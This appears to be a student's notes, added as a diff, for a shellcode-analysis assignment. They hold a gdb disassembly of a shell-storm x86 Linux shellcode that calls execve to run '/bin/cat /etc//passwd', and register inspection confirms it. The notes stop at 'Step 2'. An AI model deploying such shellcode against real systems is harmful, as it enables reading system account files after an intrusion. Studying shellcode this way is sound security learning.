@@ -1,1 +1,39 @@
 Assignment-6.2 Steps
+
+Step 1:
+Original shell-storm.org Source File : http://shell-storm.org/shellcode/files/shellcode-571.php
+Original shellcode analysis (in gdb) is as below:
+
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x80002040 <+0>:     xor    eax,eax
+   0x80002042 <+2>:     cdq
+   0x80002043 <+3>:     push   edx
+   0x80002044 <+4>:     push   0x7461632f
+   0x80002049 <+9>:     push   0x6e69622f
+   0x8000204e <+14>:    mov    ebx,esp
+   0x80002050 <+16>:    push   edx
+   0x80002051 <+17>:    push   0x64777373
+   0x80002056 <+22>:    push   0x61702f2f
+   0x8000205b <+27>:    push   0x6374652f
+   0x80002060 <+32>:    mov    ecx,esp
+   0x80002062 <+34>:    mov    al,0xb
+   0x80002064 <+36>:    push   edx
+   0x80002065 <+37>:    push   ecx
+   0x80002066 <+38>:    push   ebx
+   0x80002067 <+39>:    mov    ecx,esp
+   0x80002069 <+41>:    int    0x80
+   0x8000206b <+43>:    add    BYTE PTR [eax],al
+End of assembler dump.
+
+(gdb) display /x $ebx
+1: /x $ebx = 0xbffff640
+(gdb) x/s 0xbffff640
+0xbffff640:     "/bin/cat"
+(gdb) display /x $ecx
+2: /x $ecx = 0xbffff630
+(gdb) x/s 0xbffff630
+0xbffff630:     "/etc//passwd"
+(gdb)
+
+Step 2:
